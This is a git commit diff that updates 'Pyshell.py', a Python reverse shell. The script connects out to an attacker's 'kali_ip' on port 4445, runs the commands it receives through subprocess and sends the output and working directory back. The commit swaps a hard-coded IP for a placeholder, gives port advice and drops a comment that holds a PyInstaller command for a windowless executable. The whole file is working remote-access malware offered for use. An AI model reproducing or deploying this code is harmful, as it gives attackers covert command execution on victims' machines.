b3c6a4d81c1c6a11d6ee039b9bf18c3bcdc72482
Arjanit Pronaj <arjanitpronaj6@gmail.com>
2025-05-15 18:40:43 +0200

    Update Pyshell.py

--- Pyshell.py
+++ Pyshell.py
@@ -1,9 +1,8 @@
 import socket
 import subprocess
-import os  # Nevojitet për të marrë direktorinë aktuale        python -m PyInstaller --onefile --noconsole pythacces.py
-
-kali_ip = "10.54.6.62"
-kali_port = 4445
+import os 
+kali_ip = " " # your kali linux IP
+kali_port = 4445  # the port it coluld be change but i will recomand that the port is much higher 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((kali_ip, kali_port))
@@ -14,7 +13,6 @@ while True:
         break
 
     try:
-        # Ndrysho direktorinë nëse komanda është cd
         if command.startswith("cd "):
             os.chdir(command[3:].strip())
             result = ""
@@ -24,7 +22,6 @@ while True:
     except Exception as e:
         result = str(e)
 
-    # Merr direktorinë aktuale
     current_dir = os.getcwd()
     message = result + "\n" + f"{current_dir}> "
     s.send(message.encode("utf-8"))
